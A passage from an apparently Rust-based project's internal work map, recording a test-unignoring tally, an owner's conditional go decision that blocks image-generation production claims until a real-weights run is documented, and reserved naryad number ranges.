28 of the planned 31 (loud): vm_golden's 2 stay (their full-corpus blockers — `p_match_switch` match-in-VM and 6 candle-gated reflex examples — are outside this naryad's own §3); kv's 1 returned with the accurate root (KV_STORE is process-global BY DESIGN, `src/builtins/memory.rs:18` — the test's isolation premise contradicts the design for BOTH backends). `#[ignore]` 136→108 (−28, not −31). Local evidence: n160 23/23+1ign, n161 8/8, dept 3/3, corpus scan 154 pairs (8 residual, all out of scope), crosscheck 1/1, golden 3/3, lib 613/613, fmt+clippy clean | PR #252 |

**Owner gate decision (2026-09-09, Vision plan §6 — recorded here per naryad #246):**
conditional GO on the code while the real-weights run is PARKED (runbook
`docs/research/naryad-237-real-weights-runbook.md`). An assumption is an
assumption, not a verification («допущение ≠ верификация») — the gate reopens
only with the actual real-weights run per runbook #237. **Production claims
about image generation and the start of a new pillar (Voice) are BLOCKED until
the real-run line in `docs/research/naryad-212-go-no-go.md` is filled by an
actual run (PNG path, SHA-256, timings, hardware).**

**Free ranges:** the #206-208 buffer is exhausted (#206 merged, #207/#208 remain
#206's debt); #220-229 are reserved for the Voice pillar
(`Metalogos_Voice_Pillar_Plan.md`); #230 was the Vision R2 hotfix (golden pinning
plus PRNG SSOT); #231 and up are free for maintenance and hotfixes until a new
pillar reserves a range.

**Rule:** before starting any naryad, the executor checks this map and
ADR-0121's update note. A new pillar must reserve a number range in its own
scope ADR before its first naryad, not in a private plan document.
